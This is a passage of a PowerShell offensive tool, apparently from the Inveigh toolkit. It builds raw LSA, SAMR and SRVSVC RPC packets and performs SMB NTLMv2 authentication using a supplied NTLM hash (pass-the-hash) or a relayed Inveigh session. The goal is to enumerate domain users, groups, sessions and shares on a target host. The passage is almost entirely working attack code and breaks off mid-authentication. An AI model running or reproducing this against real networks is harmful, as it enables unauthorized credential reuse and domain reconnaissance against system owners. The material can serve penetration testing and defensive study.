    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_Attributes",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_Qos_Len",[Byte[]](0x0c,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ImpersonationLevel",[Byte[]](0x02,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ContextMode",[Byte[]](0x01))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_EffectiveOnly",[Byte[]](0x00))
    $LSAOpenPolicy.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $LSAOpenPolicy
}

function New-PacketLSAQueryInfoPolicy
{
    param([Byte[]]$Handle)

    $LSAQueryInfoPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAQueryInfoPolicy.Add("PointerToHandle",$Handle)
    $LSAQueryInfoPolicy.Add("Level",[Byte[]](0x05,0x00))

    return $LSAQueryInfoPolicy
}

function New-PacketLSAClose
{
    param([Byte[]]$Handle)

    $LSAClose = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAClose.Add("PointerToHandle",$Handle)

    return $LSAClose
}

function New-PacketLSALookupSids
{
    param([Byte[]]$Handle,[Byte[]]$SIDArray)

    $LSALookupSids = New-Object System.Collections.Specialized.OrderedDictionary
    $LSALookupSids.Add("PointerToHandle",$Handle)
    $LSALookupSids.Add("PointerToSIDs_SIDArray",$SIDArray)
    $LSALookupSids.Add("PointerToNames_count",[Byte[]](0x00,0x00,0x00,0x00))
    $LSALookupSids.Add("PointerToNames_NULL_pointer",[Byte[]](0x00,0x00,0x00,0x00))
    $LSALookupSids.Add("PointerToNames_level",[Byte[]](0x01,0x00))
    $LSALookupSids.Add("PointerToCount",[Byte[]](0x00,0x00))
    $LSALookupSids.Add("PointerToCount_count",[Byte[]](0x00,0x00,0x00,0x00))

    return $LSALookupSids
}

# SAMR

function New-PacketSAMRConnect2
{
    param([String]$SystemName)

    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)

    if($SystemName.Length % 2)
    {
        $system_name += 0x00,0x00
    }
    else
    {
        $system_name += 0x00,0x00,0x00,0x00
    }

    $SAMRConnect2 = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRConnect2.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRConnect2.Add("PointerToSystemName_MaxCount",$max_count)
    $SAMRConnect2.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRConnect2.Add("PointerToSystemName_ActualCount",$max_count)
    $SAMRConnect2.Add("PointerToSystemName_SystemName",$system_name)
    $SAMRConnect2.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $SAMRConnect2
}

function New-PacketSAMRConnect5
{
    param([String]$SystemName)

    $SystemName = "\\" + $SystemName
    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)

    if($SystemName.Length % 2)
    {
        $system_name += 0x00,0x00
    }
    else
    {
        $system_name += 0x00,0x00,0x00,0x00
    }

    $SAMRConnect5 = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRConnect5.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRConnect5.Add("PointerToSystemName_MaxCount",$max_count)
    $SAMRConnect5.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToSystemName_ActualCount",$max_count)
    $SAMRConnect5.Add("PointerToSystemName_SystemName",$system_name)
    $SAMRConnect5.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMRConnect5.Add("LevelIn",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_ClientVersion",[Byte[]](0x02,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

    return $SAMRConnect5
}

function New-PacketSAMRGetMembersInAlias
{
    param([Byte[]]$Handle)

    $SAMRGetMembersInAlias = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRGetMembersInAlias.Add("PointerToConnectHandle",$Handle)

    return $SAMRGetMembersInAlias
}

function New-PacketSAMRClose
{
    param([Byte[]]$Handle)

    $SAMRClose = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRClose.Add("PointerToConnectHandle",$Handle)

    return $SAMRClose
}

function New-PacketSAMROpenAlias
{
    param([Byte[]]$Handle,[Byte[]]$RID)

    $SAMROpenAlias = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenAlias.Add("PointerToConnectHandle",$Handle)
    $SAMROpenAlias.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenAlias.Add("RID",$RID)

    return $SAMROpenAlias
}

function New-PacketSAMROpenGroup
{
    param([Byte[]]$Handle,[Byte[]]$RID)

    $SAMROpenGroup = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenGroup.Add("PointerToConnectHandle",$Handle)
    $SAMROpenGroup.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenGroup.Add("RID",$RID)

    return $SAMROpenGroup
}

function New-PacketSAMRQueryGroupMember
{
    param([Byte[]]$Handle)

    $SAMRQueryGroupMember = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRQueryGroupMember.Add("PointerToGroupHandle",$Handle)

    return $SAMRQueryGroupMember
}

function New-PacketSAMROpenDomain
{
    param([Byte[]]$Handle,[Byte[]]$SIDCount,[Byte[]]$SID)

    $SAMROpenDomain = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenDomain.Add("PointerToConnectHandle",$Handle)
    $SAMROpenDomain.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenDomain.Add("PointerToSid_Count",$SIDCount)
    $SAMROpenDomain.Add("PointerToSid_Sid",$SID)

    return $SAMROpenDomain
}

function New-PacketSAMREnumDomainUsers
{
    param([Byte[]]$Handle)

    $SAMREnumDomainUsers = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMREnumDomainUsers.Add("PointerToDomainHandle",$Handle)
    $SAMREnumDomainUsers.Add("PointerToResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMREnumDomainUsers.Add("AcctFlags",[Byte[]](0x10,0x00,0x00,0x00))
    $SAMREnumDomainUsers.Add("MaxSize",[Byte[]](0xff,0xff,0x00,0x00))

    return $SAMREnumDomainUsers
}

function New-PacketSAMRLookupNames
{
    param([Byte[]]$Handle,[String]$Names)

    [Byte[]]$names_bytes = [System.Text.Encoding]::Unicode.GetBytes($Names)
    [Byte[]]$name_len = ([System.BitConverter]::GetBytes($names_bytes.Length))[0,1]
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($Names.Length)

    $SAMRLookupNames = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRLookupNames.Add("PointerToDomainHandle",$Handle)
    $SAMRLookupNames.Add("NumNames",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_MaxCount",[Byte[]](0xe8,0x03,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_NameLen",$name_len)
    $SAMRLookupNames.Add("PointerToNames_Names_NameSize",$name_len)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_Name_MaxCount",$max_count)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_Name_ActualCount",$max_count)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_Names",$names_bytes)

    return $SAMRLookupNames
}

function New-PacketSAMRLookupRids
{
    param([Byte[]]$Handle,[Byte[]]$RIDCount,[Byte[]]$Rids)

    $SAMRLookupRIDS = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRLookupRIDS.Add("PointerToDomainHandle",$Handle)
    $SAMRLookupRIDS.Add("NumRids",$RIDCount)
    $SAMRLookupRIDS.Add("Unknown",[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))
    $SAMRLookupRIDS.Add("NumRids2",$RIDCount)
    $SAMRLookupRIDS.Add("Rids",$Rids)

    return $SAMRLookupRIDS
}

# SRVSVC
function New-PacketSRVSVCNetSessEnum
{
    param([String]$ServerUNC)

    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)
       
    if($ServerUNC.Length % 2)
    {
        $server_UNC += 0x00,0x00
    }
    else
    {
        $server_UNC += 0x00,0x00,0x00,0x00
    }

    $SRVSVCNetSessEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_MaxCount",$max_count)
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ActualCount",$max_count)
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ServerUNC",$server_UNC)
    $SRVSVCNetSessEnum.Add("PointerToClient_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_Client",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_User",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToLevel",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToLevel_Level",[Byte[]](0x0a,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_Ctr",[Byte[]](0x0a,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_ReferentID",[Byte[]](0x0c,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $SRVSVCNetSessEnum.Add("PointerToResumeHandle_ReferentID",[Byte[]](0x10,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToResumeHandle_ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $SRVSVCNetSessEnum
}

function New-PacketSRVSVCNetShareEnumAll
{
    param([String]$ServerUNC)

    $ServerUNC = "\\" + $ServerUNC
    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)

    if($ServerUNC.Length % 2)
    {
        $server_UNC += 0x00,0x00
    }
    else
    {
        $server_UNC += 0x00,0x00,0x00,0x00
    }

    $SRVSVCNetShareEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_MaxCount",$max_count)
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ActualCount",$max_count)
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ServerUNC",$server_UNC)
    $SRVSVCNetShareEnum.Add("PointerToLevel_Level",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Ctr",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_Ctr1_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $SRVSVCNetShareEnum.Add("ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $SRVSVCNetShareEnum
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 5000
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()
        $stage = 'NegotiateSMB'

        while($stage -ne 'Exit')
        {

            try
            {
                
                switch ($stage)
                {

                    'NegotiateSMB'
                    {          
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                        {
                            $SMB_version = 'SMB1'
                            $stage = 'NTLMSSPNegotiate'

                            if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    Write-Verbose "[+] SMB signing is required"
                                    $SMB_signing = $true
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x15,0x82,0x08,0xa0
                                }

                            }
                            else
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is not required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    $SMB_signing = $false
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x05,0x82,0x08,0xa0
                                }

                            }

                        }
                        else
                        {
                            $stage = 'NegotiateSMB2'

                            if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    Write-Verbose "[+] SMB signing is required"
                                    $SMB_signing = $true
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x15,0x82,0x08,0xa0
                                }

                            }
                            else
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is not required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    $SMB_signing = $false
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x05,0x80,0x08,0xa0
                                }

                            }

                        }

                        Write-Verbose "[+] SMB version is $SMB_version"
                    }

                    'NegotiateSMB2'
                    {
                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $message_ID = 1
                        $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'
                    }
                        
                    'NTLMSSPNegotiate'
                    { 
                        
                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                Write-Output "[-] $error_message"
            }

        }

        if(!$SigningCheck)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $SMB_session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        Write-Output "[-] SMB1 is not supported"
                        $login_successful = $false
